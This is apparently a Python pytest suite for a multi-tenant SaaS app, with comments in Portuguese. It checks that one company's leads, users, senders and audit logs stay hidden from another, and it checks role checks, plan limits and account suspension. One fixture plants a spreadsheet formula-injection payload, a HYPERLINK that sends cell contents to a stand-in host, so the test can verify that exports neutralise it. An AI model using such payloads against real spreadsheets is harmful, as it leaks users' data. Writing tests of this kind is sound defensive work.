"""O teste que importa num SaaS: dado de uma empresa NUNCA aparece para outra.

Cada caso tenta, pela API, alcançar algo da empresa B estando logado na A (ou o
contrário), e espera a mesma resposta de "não existe".
"""

from __future__ import annotations

import io

from openpyxl import load_workbook

from conftest import inserir_lead, login, sql, user_id

L_A, L_A2, L_B = "2026-10-01_100000", "2026-10-02_100000", "2026-10-03_100000"


def _prepara(empresas):
    if sql("SELECT 1 FROM leads WHERE lote = ?", (L_A,)):
        return
    inserir_lead(empresas["A"], user_id("vend@a.example.com"), L_A, "cliente-a.com.br")
    inserir_lead(empresas["A"], user_id("vend2@a.example.com"), L_A2, "outro-a.com.br",
                 Company='=HYPERLINK("http://mal.example/?"&A1,"x")')
    # O MESMO site existe na empresa B: dado público, funis independentes.
    inserir_lead(empresas["B"], user_id("admin@b.example.com"), L_B, "cliente-a.com.br",
                 Company="Visto pela B")


def test_vendedor_ve_so_os_seus(app, empresas):
    _prepara(empresas)
    v = login(app, "vend@a.example.com")
    assert [l["id"] for l in v.get("/lotes").json()["lotes"]] == [L_A]
    assert v.get(f"/lotes/{L_A2}").status_code == 404          # do colega
    assert v.get(f"/lotes/{L_A2}/xlsx").status_code == 404


def test_admin_ve_a_empresa_mas_nunca_a_outra(app, empresas):
    _prepara(empresas)
    a = login(app, "admin@a.example.com")
    assert {l["id"] for l in a.get("/lotes").json()["lotes"]} == {L_A, L_A2}
    assert a.get(f"/lotes/{L_B}").status_code == 404
    assert a.get(f"/lotes/{L_B}/xlsx").status_code == 404
    assert L_B not in {l["id"] for l in a.get("/admin/lotes").json()}
    # A B enxerga o MESMO site com os dados dela, não os da A.
    b = login(app, "admin@b.example.com")
    rows = b.get(f"/lotes/{L_B}").json()["rows"]
    assert [r["Company"] for r in rows] == ["Visto pela B"]
    assert {l["id"] for l in b.get("/lotes").json()["lotes"]} == {L_B}


def test_ids_de_outra_empresa_respondem_404(app, empresas):
    _prepara(empresas)
    a = login(app, "admin@a.example.com")
    alvo_b = user_id("admin@b.example.com")
    assert a.patch(f"/admin/users/{alvo_b}", json={"name": "invadido"}).status_code == 404
    assert a.delete(f"/admin/users/{alvo_b}").status_code == 404
    assert a.put(f"/admin/senders/{alvo_b}", json={"from_email": "x@x.com",
                                                   "smtp_password": "y"}).status_code == 404
    assert a.delete(f"/admin/senders/{alvo_b}").status_code == 404
    assert a.get(f"/admin/audit?user_id={alvo_b}").status_code == 404
    assert a.post(f"/admin/lotes/{L_B}/owner",
                  json={"user_id": user_id("vend@a.example.com")}).status_code == 404
    assert a.post(f"/admin/lotes/{L_A}/owner", json={"user_id": alvo_b}).status_code == 404
    assert sql("SELECT name FROM users WHERE id = ?", (alvo_b,))[0][0] != "invadido"


def test_usuarios_e_auditoria_por_empresa(app, empresas):
    a = login(app, "admin@a.example.com")
    emails = {u["email"] for u in a.get("/admin/users").json()["users"]}
    assert "admin@b.example.com" not in emails and "admin@a.example.com" in emails
    atividade = a.get("/admin/audit").json()
    assert all("Empresa B" not in (x["detail"] or "") for x in atividade)
    assert all(x["user"] != "Admin Empresa B" for x in atividade)


def test_papel_errado_nao_entra(app, dono, empresas):
    v = login(app, "vend@a.example.com")
    a = login(app, "admin@a.example.com")
    for path in ("/admin/users", "/admin/lotes", "/admin/senders", "/admin/audit"):
        assert v.get(path).status_code == 403
    for path in ("/plataforma/empresas", f"/plataforma/empresas/{empresas['A']}/nicho"):
        assert a.get(path).status_code == 403
        assert v.get(path).status_code == 403
    # O dono da plataforma configura empresas, mas NÃO lê dado de cliente.
    for path in ("/lotes", f"/lotes/{L_A}", "/admin/users", "/meta"):
        assert dono.get(path).status_code == 403


def test_admin_nao_muda_o_proprio_plano(app, empresas):
    a = login(app, "admin@a.example.com")
    assert a.put("/admin/plan", json={"plano": "empresarial", "trial_ate": ""}).status_code == 405
    assert a.get("/admin/plan").status_code == 200


def test_plano_corta_colunas_no_servidor(app, dono, empresas):
    _prepara(empresas)
    dono.patch(f"/plataforma/empresas/{empresas['A']}", json={"plano": "essencial"})
    try:
        a = login(app, "admin@a.example.com")
        det = a.get(f"/lotes/{L_A}").json()
        assert "Porte" not in det["columns"] and "LinkedIn" not in det["columns"]
        assert all("Porte" not in r and "LinkedIn" not in r for r in det["rows"])
        wb = load_workbook(io.BytesIO(a.get(f"/lotes/{L_A}/xlsx").content))
        cab = [c.value for c in next(wb.active.iter_rows(max_row=1))]
        assert "Porte" not in cab and "LinkedIn" not in cab
    finally:
        dono.patch(f"/plataforma/empresas/{empresas['A']}", json={"plano": "empresarial"})


def test_planilha_nao_executa_formula(app, empresas):
    _prepara(empresas)
    a = login(app, "admin@a.example.com")
    wb = load_workbook(io.BytesIO(a.get(f"/lotes/{L_A2}/xlsx").content))
    cel = wb.active["A2"]
    assert str(cel.value).startswith("=HYPERLINK") and cel.data_type == "s"


def test_emails_enviados_sao_por_empresa(empresas):
    from datetime import datetime
    from app import db, sent_log
    with db.conn() as c:
        sent_log.registrar(c, empresas["A"], "pessoa@lead.com.br", datetime.now(), "vend@a")
        assert "pessoa@lead.com.br" in sent_log.contatados(c, empresas["A"])
        assert "pessoa@lead.com.br" not in sent_log.contatados(c, empresas["B"])


def test_repositorio_recusa_consulta_sem_empresa():
    import pytest
    from app import db, leads
    with db.conn() as c:
        with pytest.raises(ValueError):
            leads.lotes(c, "", None)
        with pytest.raises(ValueError):
            leads.gravar(c, "", [], now="x", lote="y")


def test_empresa_suspensa_perde_acesso_na_hora(app, dono, empresas):
    b = login(app, "admin@b.example.com")
    assert b.get("/auth/me").status_code == 200
    dono.patch(f"/plataforma/empresas/{empresas['B']}", json={"active": False})
    try:
        assert b.get("/auth/me").status_code == 403
        r = b.post("/auth/login", json={"email": "admin@b.example.com", "password": "senha-123456"})
        assert r.status_code == 401
    finally:
        dono.patch(f"/plataforma/empresas/{empresas['B']}", json={"active": True})
